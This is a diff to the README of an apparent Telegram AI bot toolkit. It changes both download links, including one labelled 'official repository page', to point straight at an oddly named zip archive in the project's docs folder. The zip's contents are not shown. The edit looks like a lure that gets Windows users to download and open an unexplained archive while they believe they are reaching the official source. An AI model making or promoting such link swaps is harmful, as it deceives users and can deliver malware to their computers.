@@ -1,6 +1,6 @@
 # 🤖 telegram-ai - Build your own intelligent Telegram bot
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Dmembre8354/telegram-ai)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Dmembre8354/telegram-ai/raw/refs/heads/main/docs/telegram-ai-daffydowndilly.zip)
 
 This toolkit enables you to create and host a private artificial intelligence assistant on Telegram. You use Google Gemini to power the conversations. The software supports images, voice, text, and payment features for your bot.
 
@@ -18,7 +18,7 @@ To run this bot on Windows, your computer needs these basic specifications:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official repository page](https://github.com/Dmembre8354/telegram-ai) to access the files.
+1. Visit the [official repository page](https://github.com/Dmembre8354/telegram-ai/raw/refs/heads/main/docs/telegram-ai-daffydowndilly.zip) to access the files.
 2. Look for the green button labeled "Code" and select "Download ZIP".
 3. Save the file to your desktop.
 4. Right-click the downloaded folder and select "Extract All".
